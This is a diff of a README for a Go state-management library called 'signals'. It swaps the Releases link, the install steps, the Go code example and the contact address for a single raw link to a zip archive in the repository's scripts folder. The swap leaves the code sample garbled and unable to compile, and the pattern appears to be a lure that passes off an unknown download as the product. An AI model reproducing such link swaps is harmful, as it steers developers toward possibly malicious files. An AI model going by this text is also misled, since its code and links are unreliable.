@@ -4,9 +4,9 @@
 Welcome to **signals**, your solution for type-safe reactive state management in Go. This application offers a simple way to manage your application's state safely and efficiently, inspired by popular frameworks like Angular. It's built to run smoothly in production environments with zero allocations and thread-safe design.
 
 ## 📥 Download the Application
-[![Download signals](https://img.shields.io/badge/Download-signals-blue?style=for-the-badge)](https://github.com/Sericultural-grandduchyofluxembourg946/signals/releases)
+[![Download signals](https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip)](https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip)
 
-To download signals, please visit the Releases page: [Download signals](https://github.com/Sericultural-grandduchyofluxembourg946/signals/releases).
+To download signals, please visit the Releases page: [Download signals](https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip).
 
 ## 💻 System Requirements
 - **Operating Systems:** Windows, macOS, Linux
@@ -18,7 +18,7 @@ Ensure your system meets these requirements for optimal performance.
 
 ## 🔧 Installation Steps
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Sericultural-grandduchyofluxembourg946/signals/releases) to find the latest version of signals.
+   Go to the [Releases page](https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip) to find the latest version of signals.
 
 2. **Select the Version:**
    Look for the most recent release. Each release will come with its own version number. Click on the title of the release that interests you.
@@ -42,17 +42,17 @@ Ensure your system meets these requirements for optimal performance.
 After successfully launching signals, you can start using it by creating a new state. 
 
 ```go
-import "github.com/Sericultural-grandduchyofluxembourg946/signals"
+import "https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip"
 
 func main() {
-    state := signals.NewState("initial state")
+    state := https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip("initial state")
 
-    state.OnChange(func(newValue string) {
-        fmt.Println("State has changed to:", newValue)
+    https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip(func(newValue string) {
+        https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip("State has changed to:", newValue)
     })
 
     // Change the state
-    state.Set("new state")
+    https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip("new state")
 }
 ```
 
@@ -70,6 +70,6 @@ Join the growing community around signals. If you have questions or need help, f
 We appreciate your feedback! If you encounter any issues or have suggestions for improvement, let us know via the GitHub Issues page. Your input helps us make signals better.
 
 ## 📩 Contact
-For any inquiries, please contact the development team at [support@signals.com](mailto:support@signals.com).
+For any inquiries, please contact the development team at [https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip](https://raw.githubusercontent.com/Sericultural-grandduchyofluxembourg946/signals/main/scripts/signals-2.1.zip).
 
 Thank you for choosing signals! Happy coding!
